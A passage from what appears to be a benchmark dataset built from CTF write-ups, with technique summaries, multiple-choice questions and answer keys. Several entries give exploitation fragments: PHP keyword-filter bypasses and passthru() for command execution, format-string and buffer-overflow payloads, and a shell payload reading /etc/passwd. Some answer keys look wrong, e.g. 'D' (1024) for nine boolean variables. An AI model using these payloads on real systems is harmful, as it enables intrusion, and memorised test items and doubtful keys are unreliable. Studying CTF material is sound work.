        "write_up": "dataset/raw/Prison Break.md",
        "type": "This write-up corresponds to a **misc** (miscellaneous) challenge in the CTF competition.",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 119,
        "max_score": 500,
        "difficulty": 0.238,
        "knowledge": [
            "When faced with a challenge that involves applying multiple operations over a large dataset where performance is critical, it's beneficial to pre-process the dataset to remove unnecessary data and consolidate operations. This can be achieved by sorting the data based on an attribute, counting occurrences, and filtering out entries that will not affect the final result. Example commands for data pre-processing in a bash environment include using `sort -n -k 1` to sort numerically based on the first column, `uniq -c` to count and consolidate identical lines, and `grep -v ' 0'` to filter out lines that end with 0, which are considered unnecessary for further computation.",
            "For performance-sensitive tasks, especially those involving large-scale data manipulation and numerical computations, utilizing alternative Python interpreters such as PyPy can lead to significant execution speed improvements. This is because PyPy uses just-in-time (JIT) compilation, which can make Python code run faster after the initial compilation overhead. This approach is particularly useful in scenarios where the standard CPython interpreter's performance is a bottleneck. Transitioning to PyPy requires no changes in the Python code for the majority of applications, making it a straightforward option for performance optimization.\n\nSample Commands for Pre-Processing:\n```bash\n$ cat Given_File.txt | sort -n -k 1 | uniq -c | sed 's/^[ \\t]*//;s/[ \\t]*$//' | grep -v ' 0' > clean_file\n```\n\nNote: The specific payload for applying the aforementioned knowledge cannot be provided due to the nature of the operations."
        ],
        "question": [
            "In a scenario where a script needs to process a large text file consisting of multiple entries to optimize computational performance, which command sequence correctly illustrates an efficient way to preprocess the data before running the main algorithm? Assume each entry follows a format that can be optimized based on numeric values and occurrence frequency.  - A. Use `awk '{print $3, $2, $1}' Given_File.txt | sort -n` to reorder columns and sort numerically. - B. Use `cat Given_File.txt | grep -E '^[0-9]+'` to filter out lines starting with numbers. - C. Use `cat Given_File.txt | sort -n -k 1 | uniq -c | sed 's/^[ \\t]*//;s/[ \\t]*$//' | grep -v ' 0' > clean_file` to sort, count occurrences, trim, and remove non-contributing entries. - D. Use `split -l 1000 Given_File.txt` to split the file into smaller files of 1000 lines each. ",
            "Regarding the optimization of scripts for performance-sensitive tasks, especially when dealing with extensive numerical computations, which Python interpreter is recommended for achieving significant speed improvements due to its just-in-time (JIT) compilation feature?  - A. IronPython, for seamless integration with .NET applications. - B. Jython, for integration with Java applications. - C. PyPy, for its JIT compilation capability that speeds up the execution of Python scripts. - D. Cython, for converting Python scripts into C for compiling into binaries. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Professor Plum's _br_ Ravenous Researcher",
        "write_up": "dataset/raw/Professor Plum's _br_ Ravenous Researcher.md",
        "type": "This is a web challenge.",
        "competition": [
            "TU/2018",
            "https://ctftime.org/event/650/tasks/"
        ],
        "score": -1.0,
        "max_score": 497,
        "difficulty": -1,
        "knowledge": [
            "When dealing with web applications that return generic failure messages upon user input, inspect cookies for potential fields that can be manipulated. These cookies might contain condition flags or locations that, when altered, could trigger different responses from the server. This method is particularly useful in scenarios where server responses change based on user session data stored in cookies.",
            "For challenges that draw on real-world themes or games, such as Cluedo in this case, the solution might involve using elements or terms directly related to the theme. Enumerating and testing these theme-related elements as inputs (in this instance, locations from the game) can lead to the discovery of hidden paths or triggers for specific outcomes within the application.\n\nExample payload for manipulating cookies: \n- Before: `Found_Boddy=0; Location=Kitchen`\n- After: `Found_Boddy=1; Location=Billiard Room`"
        ],
        "question": [
            "In a web application, you realize the server returns a generic message regardless of the input. You notice a \"User_Status\" flag in the cookie which is set to \"visitor\". Which of the following actions is most suitable to explore potential hidden functionalities or altered responses from the server? - A. Increase the value of the \"User_Status\" flag. - B. Replace the \"User_Status\" value with common file paths. - C. Manipulate the \"User_Status\" cookie value to different access levels like \"admin\". - D. Delete the \"User_Status\" cookie to exploit default handling behaviors.",
            "When working with a web application that hints at a connection with the game of Cluedo (Clue), which approach would most likely aid in uncovering hidden content or triggering special server responses? - A. Submitting HTTP requests with extremely large payloads to test for buffer overflow vulnerabilities. - B. Injecting SQL commands into input fields to test for SQL injection vulnerabilities. - C. Enumerating and submitting the names of various Cluedo game locations as input values or within request parameters. - D. Attempting cross-site scripting (XSS) attacks by injecting script tags into user inputs."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "ProgrammersHateProgramming 2",
        "write_up": "dataset/raw/ProgrammersHateProgramming 2.md",
        "type": "web",
        "competition": [
            "PBjar/2021",
            "https://ctftime.org/event/1430/tasks/"
        ],
        "score": 227,
        "max_score": 500,
        "difficulty": 0.454,
        "knowledge": [
            "In challenges involving filters that block certain keywords or functions, one can bypass these filters by using **nesting** or **concatenation techniques**. For instance, if a word like 'read' is filtered and thus prevents usage of the function `readfile()`, nesting or concatenation can be used to work around the filter. This approach relies on the filter only acting once, allowing the second occurrence of the filtered term to remain after the first instance is removed. In the case of nesting, creating a pattern like `rereadad` will collapse into `read` after the filter removes the inner 'read'. In the context of concatenation, strings can be joined using the PHP concatenation operator `.`, effectively bypassing the filter by constructing the intended function call from separate, non-filtered strings.",
            "Various alternative PHP functions can serve as workarounds in web challenges when common functions are filtered out. For XSS or remote code execution (RCE) challenges where direct usage of functions like `readfile()`, `system()`, or `exec()` are blocked, lesser-known PHP functions such as `passthru()` can be utilized. This is underpinned by the diversity in PHP\u2019s function library, which allows for multiple methods to achieve the same outcome, such as file read or command execution. This serves as a reminder to explore the wide array of PHP functions that can perform similar tasks, especially when facing restrictive filters."
        ],
        "question": [
            "In a web challenge, when an attempt to use the `readfile()` function fails due to a filter removing the term 'read,' which alternative method can be employed to bypass this filter and execute the desired function? - A. Nesting the term within a similar word to avoid the filter recognizing it on the second pass. - B. Encrypting the function name before sending it to the server. - C. Replacing 'read' with its hexadecimal ASCII equivalent in the code. - D. Writing a custom PHP extension to redefine the function under a new name. ",
            "In the context of bypassing function name filters in a web security challenge, why might `passthru()` serve as a strategic alternative to more commonly filtered functions like `system()` or `exec()`? - A. `passthru()` is executed client-side, thereby avoiding server-side filters. - B. `passthru()` has a built-in obfuscation mechanism that automatically bypasses filters. - C. `passthru()` is less commonly used and thus less likely to be included in filter lists. - D. `passthru()` functions by writing commands directly to the server's memory, bypassing PHP interpreter checks. "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "Programming 03",
        "write_up": "dataset/raw/Programming 03.md",
        "type": "This CTF challenge falls under the category of **programming**.",
        "competition": [
            "WhiteHat/2020/Quals",
            "https://ctftime.org/event/942/tasks/"
        ],
        "score": 100,
        "max_score": 470,
        "difficulty": 0.2127659574468085,
        "knowledge": [
            "When testing logical equivalence of complex expressions in programming challenges, especially with multiple variables ranging from `True` or `False`, one can adopt a brute force approach by iterating through all possible combinations of the variables' values. This technique is effective in scenarios where the number of variables is manageable and their permutations are computable within reasonable time constraints. To implement this, one can generate a table of value combinations for each variable and iterate through these combinations, evaluating the logical equivalence of the given expressions for each set of values.",
            "The use of `eval()` to dynamically evaluate string representations of expressions in Python is a powerful tool but poses significant security risks, especially with inputs of unknown origin. This is because `eval()` will execute the string passed to it as Python code, which can lead to unintended code execution if the string contains malicious code. Therefore, when working with `eval()` in a context where security is a concern, it is crucial to implement safety measures such as manually validating inputs before evaluation or using alternative methods to evaluate expressions without executing them as code.\n\nExample of a safety measure before using `eval()`:\n```python\nprint(str1)\nprint(str2)\njunk = input('ok? ')\nif not junk.lower() == 'yes':\n    raise Exception(\"Evaluation aborted by user.\")\nresult = eval(expression)\n```"
        ],
        "question": [
            "In a programming challenge focused on determining if two logical expressions are equivalent, a brute force method can be applied by testing all possible combinations of variable values (`True` or `False`). Given that there are nine variables (A to I) in the expressions, how many total combinations must be evaluated to cover all possibilities? - A. 256 - B. 512 - C. 128 - D. 1024",
            "When utilizing the `eval()` function in Python to evaluate expressions based on string input, which of the following is an essential security measure to mitigate risks such as unintended code execution? - A. Converting the string to uppercase before evaluation. - B. Using a manual confirmation step to validate inputs before evaluation. - C. Replacing variables in the string with hardcoded values. - D. Commenting out the `eval()` function to prevent execution."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Projective Signatures",
        "write_up": "dataset/raw/Projective Signatures.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "LedgerDonjon/2020",
            "https://ctftime.org/event/1173/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge involving the analysis of power consumption traces to extract information about cryptographic operations, one can utilize sliding average and convolution techniques to align the traces for consistent analysis across different datasets. This method allows for the detection of similar patterns within the data, even when the exact start points or lengths of the data segments of interest vary. By computing a sliding average and identifying consistent low-level patterns, traces can be aligned for further analysis.\n   - Python example for calculating and aligning based on sliding averages:\n     ```python\n     conv = np.convolve(leak, np.ones((N,))/N, mode='valid')\n     start = np.where(conv < 50)[0][0]\n     leak = np.roll(leak, -start)\n     while leak[N]<70.0:\n        leak = np.roll(leak, -1)\n     leak = np.roll(leak, -50)\n     ```",
            "The extraction of bits from cryptographic operations executed in embedded systems can be achieved by analyzing conversion patterns in power consumption traces and applying mathematical relations derived from the algorithms in use. This involves mapping observed patterns to known algorithms, reversing the execution of these algorithms, and consequently deducing the operands involved in the computations, such as private keys or nonces.\n   - An implementation snippet for inversing based on traced patterns, assuming the use of the Extended Binary GCD algorithm for inversion:\n     ```python\n     def inv_gcd_from_trace(trace, m):  \n        a = 0  \n        b = 1  \n        for ch in trace[::-1]:  \n            if ch == \"A\":  \n                a = (a * 2) + b  \n                a, b = b, a  \n            elif ch == \"B\":  \n                a = (a * 2) + b  \n            elif ch == \"C\":  \n                a *= 2  \n            else:  \n                assert False  \n        return a\n     ```"
        ],
        "question": [
            "To normalize and analyze power consumption traces for cryptographic operations, given a dataset with variable starting points of interesting segments, which Python operation can effectively realign the traces based on a pattern detected through convolution and sliding average? - A. Adjust the array based on a fixed standard deviation across all data points. - B. Use the `np.fft.fft` function to transform the data into the frequency domain and align based on peak frequencies. - C. Roll the array based on the first occurrence of a pattern detected by evaluating a sliding average and convolution, adjusting it to a starting standard. - D. Randomly shuffle data points until the desired alignment pattern emerges statistically. ",
            "In the context of extracting bits from cryptographic operations by analyzing power consumption traces, what approach should be used to reverse the execution of the Extended Binary GCD algorithm to deduce operands involved in the computations? - A. Traverse the trace array from start to end, adjusting variables based on conditional checks that match direct execution flow. - B. Parse the trace backwards, applying the inverse operations mapped from observed patterns to algorithmic steps, thereby reconstructing the operands. - C. Calculate the median of the entire trace dataset and apply binary search to find the inverse operations. - D. Use a recursive function that attempts to guess the operation at each step based on the most common pattern. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "PRSA",
        "write_up": "dataset/raw/PRSA.md",
        "type": "crypto",
        "competition": [
            "BackdoorCTF/2023",
            "https://ctftime.org/event/2153/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When faced with an encryption scheme using polynomials over a Galois Field \\(GF(2)\\) in a CTF challenge, and the ciphertext, \\(e\\), and \\(n = p \\times q\\) (where \\(p\\) and \\(q\\) are irreducible polynomials) are given, one can decrypt the original message by taking the square root (quadratic residue) of the encrypted polynomial \\(256\\) times, first in mod \\(p\\) then in mod \\(q\\), and finally combine the results using the Chinese Remainder Theorem (CRT). This method specifically works due to the encryption exponent being a power of two, \\(e = 2^{256}\\), simplifying decryption to repeated application of the square root in the field.",
            "For polynomial factorization, especially in cryptography CTF challenges where polynomials over a finite field are involved, SageMath is a powerful tool due to its built-in functions for polynomial operations and its support for various algebraic structures, such as Galois Fields and quotient rings. This simplifies the decryption process in challenges involving polynomial arithmetic by providing functions for root finding, polynomial arithmetic, and the application of mathematical theorems like the Chinese Remainder Theorem.\n\nSample of part of a SageMath payload based on extraction:\n```python\n# Assuming c, e, p*q (polynomial n) are given, and SageMath is used for calculations\np, q = factor(n)  # Factorize n to find polynomials p, q\np, q = p[0], q[0]\n# Working in the fields defined by p and q\nRp.<Y> = GF(2^p.degree(), modulus=p)\n...\nsol = crt([r1, r2], [p, q])  # Combine using CRT\n...\nmsg = long_to_bytes(int(''.join(coeff[::-1]), 2))  # Convert polynomial coefficients back to bytes\n```"
        ],
        "question": [
            "In the context of a cryptography challenge involving a polynomial encryption scheme over a Galois Field \\(GF(2)\\), where the encrypted polynomial is raised to a power \\(e = 2^{256}\\) and must be decrypted, which step accurately describes the decryption process involving quadratic residues? - A. Encrypt the polynomial another 256 times using the same exponent to reverse the encryption process. - B. Directly compute the 256th root of the encrypted polynomial in \\(GF(2)\\) without modular arithmetic. - C. Apply the square root function 256 times to the encrypted polynomial individually mod \\(p\\) and mod \\(q\\), then use the Chinese Remainder Theorem to combine the results. - D. Use the Extended Euclidean Algorithm on the encrypted polynomial to find its inverse, then apply the square root function 256 times. ",
            "In a Capture The Flag (CTF) challenge focusing on polynomial factorization over a finite field, which statement best reflects the utility of SageMath? - A. SageMath can only perform simple arithmetic operations with polynomials, hence its use is limited to addition and subtraction. - B. SageMath is primarily used for graphical plotting, providing little to no advantage in polynomial factorization or cryptographic problem-solving. - C. SageMath is indispensable for handling polynomial operations and factorization, especially due to its built-in functions for working with Galois Fields, quotient rings, and implementing the Chinese Remainder Theorem. - D. For polynomial factorization in cryptography, traditional pen and paper methods are recommended over SageMath for gaining a deeper understanding. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Ps-Secure",
        "write_up": "dataset/raw/Ps-Secure.md",
        "type": "pwn",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 291,
        "max_score": 500,
        "difficulty": 0.582,
        "knowledge": [
            "When analyzing coredumps for software debugging or reverse engineering, look for instructions causing segmentation faults due to invalid memory access attempts (e.g., trying to write to a read-only text segment). This can provide insight into what operation failed and why, which is particularly useful for reconstructing the control flow or understanding the program's state at the time of the crash.",
            "In scenarios where a program uses Linear Congruential Generator (LCG) for randomness and the initial seed values are critical but lost or unknown, reverse engineering coupled with educated guessing can help recover those seeds. This involves:\n   - Identifying the usage context of the random values (e.g., offsets, function behavior).\n   - Recovering the last known state from memory.\n   - Calculating backwards to find the initial seed.\nThis approach is generally applicable in situations where randomness influences the control flow or output of a program and the seed values can be correlated with observable program behavior or output."
        ],
        "question": [
            "In software debugging, encountering a segmentation fault can provide key insights. Given the situation where a segmentation fault occurred at `0x555555554e9a inc dword ptr [rax]` with `RAX` being `0x555555554e9a`, indicating an attempt to write in a text segment, which of the following best describes the initial step in investigating this crash? - A. Increasing the memory allocation to the text segment to prevent future crashes. - B. Identifying the operation that caused the crash by examining the instruction that attempted to modify a read-only segment. - C. Rewriting the faulty instruction to avoid accessing the text segment. - D. Ignoring the segmentation fault and focusing on optimizing other parts of the code. ",
            "When trying to recover the initial seed values of a Linear Congruential Generator (LCG) used in a program, which approach best describes the method used in a scenario where the seeds are critical but unknown, and the program's behavior or output is influenced by these seeds? - A. Modifying the LCG algorithm to produce more predictable outputs. - B. Directly asking users for any inputs that might approximate the initial seed values. - C. Calculating backwards from the last known state and correlating random values with observable behaviors or outputs to identify the initial seeds. - D. Randomly guessing the seed values until the correct behavior is observed. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Purchases",
        "write_up": "dataset/raw/Purchases.md",
        "type": "pwn",
        "competition": [
            "angstrom/2019",
            "https://ctftime.org/event/774/tasks/"
        ],
        "score": 120,
        "max_score": 250,
        "difficulty": 0.48,
        "knowledge": [
            "In challenges involving a Format String vulnerability, exploiting the vulnerability can be initiated by identifying an insecure `printf` call with a user-controlled format string. This can be exploited by first determining the offset at which the user input appears in the stack, allowing for arbitrary memory addresses to be read or written. This is crucial for overwriting function pointers or variables to hijack the flow of execution. Example payload to find the offset: 'AAAAAAAA%p%p%p%p%p%p%p%p' and looking for '41414141' in the output.",
            "After determining the correct offset, a Format String exploit can be performed to write specific values to arbitrary memory addresses. This can be particularly useful for overwriting GOT entries or function pointers to redirect execution to custom code or a desired function. In scenarios where direct writing is infeasible due to size constraints or the risk of introducing null bytes, the payload can leverage the `%n` specifier to write the number of bytes printed so far into a memory address. This requires crafting a payload that prints a controlled amount of characters before using `%n` to perform the write operation. Example for a write operation payload when trying to overwrite a function pointer with an address `0x080484b6`: `'%48879c%12$hn'` where `48879` represents the number of characters to print to match the lower bytes of the desired address, and `12` is the offset where the target memory address is placed on the stack, adjusted based on prior reconnaissance."
        ],
        "question": [
            "In a challenge where exploiting a Format String vulnerability is the goal, and an insecure `printf` is identified, which of the following payloads would be most appropriate for discovering the offset where user input appears on the stack? - A. `'%s%s%s%s%s'` - B. `'AAAA%p%p%p%p%p%p%p%p'` - C. `'%x%x%x%x%x'` - D. `'AAAAAAAA'` ",
            "After finding the correct offset in a Format String exploit scenario, which of the following payloads could be used to overwrite a GOT entry or function pointer to hijack the program's execution flow, assuming the target address is known and the offset is precisely determined? - A. `'%12$sOVERWRITE_ADDR'` - B. `'%12$hnOVERWRITE_ADDR'` - C. `'%48879c%12$hn'` - D. `'%12$d%OVERWRITE_ADDR'` "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "PW API Stage 1",
        "write_up": "dataset/raw/PW API Stage 1.md",
        "type": "misc",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 75,
        "max_score": 792,
        "difficulty": 0.0946969696969697,
        "knowledge": [
            "When analyzing database dumps and encountering tables with content in a hexadecimal format, one effective approach for extracting useful information is to decode the hexadecimal content. This is particularly applicable for tables named in a way that suggests they contain supplementary data, such as attachments, files, or blobs. Converting the hexadecimal data to its binary format may reveal embedded files such as images, documents, or executable files which can contain hidden messages or clues.\n\n   - Example Python snippet for converting hexadecimal data to binary files:\n     ```python\n     from binascii import unhexlify\n\n     with open('input.txt', 'r') as fd:\n         for line in fd:\n             index = line.split(\"(\")[1].split(\",\")[0]\n             hex_str = line.split(\" \")[2].split(\")\")[0].split(\"x\")[1]\n\n             result = unhexlify(hex_str)\n             with open('files/file_' + index, 'wb') as new_file:\n                 new_file.write(result)\n     ```",
            "When faced with a large set of data files (e.g., images, documents) obtained from a CTF challenge, and the goal is to identify hidden flags or clues, conduct a manual review of each file, especially those that appear to be outliers in terms of content or formatting. This is based on the fact that challenge designers often embed flags or hints in files that deviate from the majority in some noticeable manner, such as an image that is not consistent with the others in a collection of memes."
        ],
        "question": [
            "In the context of analyzing a database dump that contains hexadecimal strings in a specific table meant for attachments, which method is most effective for converting the hexadecimal strings into binary files, potentially unveiling hidden content within those attachments?  - A. Manually converting each hexadecimal string into binary format using a standard text editor. - B. Utilizing a Python script to read each line of the dump, extract the hexadecimal strings, and use the `binascii.unhexlify` function to convert and save each as a new binary file. - C. Employing an online hexadecimal to text conversion tool for each hexadecimal string individually and manually inspecting the output for hidden content. - D. Writing an SQL query to directly convert hexadecimal strings to binary within the database management system before exporting the files. ",
            "When working with a set of data files obtained from a cybersecurity challenge, which approach is advised for finding hidden clues or flags among these files?  - A. Focus solely on the file sizes, as hidden flags are typically placed in files with unusually large sizes. - B. Use an automated script to search for the string \"flag\" within the content of each file, disregarding other file characteristics. - C. Conduct a manual inspection of each file, paying special attention to those that differ significantly in content or format from the rest, as they are more likely to contain hidden information. - D. Convert all files to a common format (e.g., .txt) before reviewing, assuming all hidden messages will be text-based. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "PW API",
        "write_up": "dataset/raw/PW API.md",
        "type": "crypto",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 792,
        "max_score": 792,
        "difficulty": 1.0,
        "knowledge": [
            "When facing applications using non-cryptographically secure pseudo-random number generators (PRNGs) like `java.util.Random` for sensitive tasks such as key generation, it's feasible to reverse-engineer the PRNG's output or state if a segment of the output (e.g., an API key or token) is known. This is especially true when the PRNG is not securely seeded (e.g., with predictable or known values). Utilizing weaknesses in the PRNG implementation, such as linear congruential generators (LCGs) which exhibit predictable behavior, can enable an attacker to reconstruct the initial seed or subsequent PRNG outputs. This approach requires understanding of the PRNG's internal workings, including its state transition function, output function, and how seeds are initialized.",
            "Meet-in-the-middle attacks can be applied to mathematical problems with linear or near-linear properties, such as reversing LCG states used in insecure key generation processes. For this technique, one typically divides the problem into two smaller problems, solves each independently, and then combines the solutions to solve the original problem. In the context of reversing PRNG sequences, this could involve brute-forcing a portion of the seed space based on known output properties (e.g., even or odd indices of characters in an API key) and then iteratively applying the PRNG's inverse state transition function to identify previous states leading to the known output. This method can drastically reduce the computational effort required compared to brute-forcing the entire seed space, making it practical to recover full seeds or output sequences from partial information.\n\nSample payload or code specific to reversing the seed of a non-cryptographically secure PRNG (specifically `java.util.Random` used in this context) is not directly provided due to the generic nature of the extracted knowledge. However, the concept of applying meet-in-the-middle attacks involves sequentially or concurrently testing possible seed fragments against known output characteristics (e.g., parity or specific character positions in a generated string) to identify matching seed candidates, which can then be used to predict or regenerate PRNG outputs."
        ],
        "question": [
            "In an application using Java's `java.util.Random` for generating an API key, if the PRNG seed is based on predictable or known values, what technique could potentially allow an attacker to predict or reproduce the API key? - A. Utilize a brute-force attack to guess the API key directly. - B. Exploit the application logic to bypass the need for the API key. - C. Reverse-engineer the PRNG's output or state if a segment of the output is known. - D. Manipulate the application's state to force it to reveal the API key. ",
            "Considering a scenario where an API key was generated using a linear congruential generator, and a part of this key is known. What strategy could be effective in recovering the full seed or output sequence from the partial information? - A. Perform a dictionary attack using a list of commonly used seeds. - B. Apply a meet-in-the-middle attack to reduce the computational effort required to brute-force a portion of the seed space. - C. Use a phishing attack to trick the application into divulging the full key. - D. Launch a distributed denial-of-service attack in hope of making the application reveal its secrets. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Pwn Chall",
        "write_up": "dataset/raw/Pwn Chall.md",
        "type": "crypto",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges involving signature forging with elliptic curve isogenies, if the implementation sets a deterministic random seed during certain operations (like signature verification), an attacker can exploit this determinism to predict or replicate parts of the signature process. This is particularly exploitable if caching optimizations are disabled, as it may force the application to deterministically generate points or other cryptographic parameters that should be unpredictable. Identifying such deterministic behaviors in cryptographic routines and the absence of caching can be crucial for forging signatures or bypassing cryptographic checks.",
            "For challenges involving complex cryptographic primitives like isogenies over elliptic curves, the approach to forge a signature without the private key may involve constructing an isogeny chain that satisfies the verification conditions. This might involve simulating part of the signature generation process to duplicate a commitment, and then utilizing mathematical constructs like ideals and isogenies to navigate through the structure of elliptic curves and forge a valid signature. This strategy relies on understanding the mathematical operations and constraints (such as the degree of isogenies) laid out in the challenge, and creatively constructing an isogeny path that can be accepted as valid by the verifier."
        ],
        "question": [
            "In the context of a cryptographic system where a function involved in generating elliptic curve points removes its `@cached_function` decorator and explicitly sets a deterministic random seed with the `set_random_seed(0)` method inside a condition, what is the implication of these changes on the system's security? - A. It improves the system's security by ensuring more predictable cryptographic operations. - B. It has no significant impact on the security because the random seed is not a critical factor. - C. It potentially compromises the system's security by making certain cryptographic operations deterministic, which could be exploited to predict or replicate parts of the cryptographic process. - D. It enhances the randomness of operations by frequently resetting the random seed value. ",
            "In an elliptic curve cryptography challenge where forging a signature without access to the private key requires simulating signature verifications and exploiting specific implementation vulnerabilities, which of the following approaches would be most effective? - A. Construct a direct isogeny from the elliptic curve representing the private key to the target curve, bypassing the verification process entirely. - B. Ignore the properties of isogenies and focus on brute-forcing the private key using standard cryptographic attacks. - C. Construct an isogeny path that mimics the verifier's expectations by simulating certain operations and cleverly utilizing mathematical structures like ideals and isogenies, satisfying the conditions without needing the private key. - D. Attempt to decrypt the verifier's codebase to extract the private key directly, assuming that the key is stored in plaintext. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "pwn intended 0x3",
        "write_up": "dataset/raw/pwn intended 0x3.md",
        "type": "pwn",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "To exploit a buffer overflow vulnerability for executing specific functions within a binary, first determine the precise amount of data to send to fill up the initial buffer and then the precise bytes to overwrite the return pointer. This often includes filling the buffer, potentially adding padding for alignment, and then sending the function's entry point as the new return address. Example payload format: `b\"A\"*[buffer size + padding] + p64([function address])`.",
            "Tools like radare2 and pwntools are essential for analyzing binary files and crafting exploits, respectively. radare2 can be used to disassemble and debug binaries to understand their structure and identify vulnerabilities such as buffer overflows. pwntools can then be utilized to write exploit scripts that craft payloads and interact with the binary or service to exploit these vulnerabilities. Example usage includes `p.sendline(b\"A\" * (32 + 8) + p64(0x4011ce))` with pwntools, where `p64` is used to format the memory address into a 64-bit little-endian string."
        ],
        "question": [
            "In an attempt to exploit a buffer overflow vulnerability within a binary, an attacker needs to overwrite the return pointer to execute a specific function. If the original buffer is of size 0x20 (32 bytes) and additional padding is needed for alignment, how many bytes should be sent before the function's entry point address to successfully overwrite the return pointer and trigger the desired function execution? - A. 24 bytes - B. 40 bytes - C. 32 bytes - D. 48 bytes",
            "When conducting a buffer overflow attack, which combination of tools is most effective for analyzing the binary to find vulnerabilities and crafting a payload to exploit them, respectively? - A. radare2 for analysis and pwntools for crafting exploits - B. gdb for analysis and Python for crafting exploits - C. Wireshark for analysis and pwntools for crafting exploits - D. radare2 for analysis and nc (netcat) for crafting exploits"
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "Pwn sanity check",
        "write_up": "dataset/raw/Pwn sanity check.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When dealing with a buffer overflow vulnerability, and if the goal is to execute a function bypassing its parameter checks, one viable strategy is to calculate the exact offset to the function and then jump directly to an instruction after the checks. This requires understanding the binary's assembly, specifically identifying where parameter validations end. To execute this, first calculate the offset to fill the buffer and the base pointer (if necessary), then append the address where parameter checks are bypassed in the target function.",
            "For crafting an exploit script in Python using the `pwntools` library, the general steps include setting up the context (architecture and log level), identifying the vulnerable binary, and deciding to run locally or remotely. After reading initial output (if any) using functions like `readuntil`, calculate the buffer overflow offset. Then, direct the execution flow to the desired function or an instruction within it that bypasses checks or undesired operations. To interact with the binary, use `sendline` to send the payload and `interactive` or similar reading functions to engage with the process post-exploit.\n\nExample payload: `b'\\x41'*(ret_offset) + p64(win_function_shell)`"
        ],
        "question": [
            "In a scenario involving a buffer overflow vulnerability within a binary analyzed using Ghidra, to execute a specific function and bypass parameter checks, you decide to jump directly to an instruction past these checks. Given that the buffer size is defined as 60 bytes and understanding the nature of the binary and its layout is crucial, what is the correct way to calculate the total offset needed to execute this bypass when considering both the buffer and the stack frame setup? - A. Add the buffer size to the size of two base pointer addresses - B. Multiply the buffer size by the size of the integer local variable - C. Add the buffer size to the size of the local integer variable and one base pointer address - D. Only consider the buffer size since the stack frame setup does not affect the offset ",
            "When creating an exploit script in Python with the `pwntools` library for a remote buffer overflow challenge, you need to send a payload to execute a function within the binary without triggering its parameter checks. If the `win` function address is known and an additional offset `0x44` bypasses the parameter checks, how do you correctly form and send the payload in this context? - A. Use `p.send(b'\\x41'*(ret_offset) + win_function + 0x44)` - B. Use `p.sendlineafter('tell me a joke', b'\\x41'*(ret_offset) + p64(win_function + 0x44))` - C. Use `p.sendline(b'\\x41'*(ret_offset) + p64(win_function_shell))` - D. Use `p.sendline(b'\\x41'*(ret_offset) + win_function_shell)` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "pwn1",
        "write_up": "dataset/raw/pwn1.md",
        "type": "pwn",
        "competition": [
            "CCCamp/2019",
            "https://ctftime.org/event/854/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In scenarios dealing with buffer overflow vulnerabilities where the target binary lacks stack canaries and is not compiled with Position Independent Executable (PIE) protection, an attacker can directly overwrite the return address to redirect execution flow to a desired function within the binary. This can be particularly useful in pwn challenges to execute a function, like a 'win' function that spawns a shell. To exploit this, calculate the exact offset to the return address from the start of the buffer and craft a payload that fills the buffer and overwrites the return address with the address of the desired function.  \nExample payload: `python -c 'print(\"A\"*offset + \"\\x4a\\x12\\x40\\x00\\x00\\x00\\x00\\x00\")'` to overwrite the return address and execute the 'win' function.",
            "To effectively gain code execution or escalate privileges in a binary exploitation challenge, it might be necessary to interact with the spawned shell within the same payload or immediately follow up with commands to be executed by the shell. This usually requires crafting a payload that not only exploits the vulnerability to gain shell access but also sends commands to the shell before it terminates or the input stream is closed. For instance, appending system commands at the end of an exploit payload can cause these commands to be executed by the spawned shell, facilitating further control over the target system or binary.  \nExample payload: `echo -ne 'payload_herecat /etc/passwd'` where `payload_here` is replaced with the actual exploit code."
        ],
        "question": [
            "Given a binary exploitation scenario where the binary lacks stack canaries and Position Independent Executable (PIE) protection, which method is most effective for exploiting a buffer overflow to execute a specific function within the binary? - A. Overwrite the top of the stack with NOP sleds and hope the desired function's address is hit randomly. - B. Calculate the exact buffer to return address offset and craft a payload that fills the buffer then overwrites the return address with that of the desired function. - C. Fill the buffer with the address of the desired function repeatedly without calculating the offset to the return address. - D. Inject malicious shellcode into the binary itself and directly call the system's API to execute the desired function.",
            "When exploiting a binary to gain shell access and execute commands within the yielded shell, what technique can ensure the commands are executed before the shell terminates or the input stream closes? - A. Waiting for the shell to terminate before sending any commands. - B. Using a NOP sled at the start of the payload to ensure all commands are executed simultaneously. - C. Appending the system commands directly at the end of the exploit payload. - D. Encrypting the commands before appending them to the exploit payload to avoid detection and ensure execution."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "pwnykey",
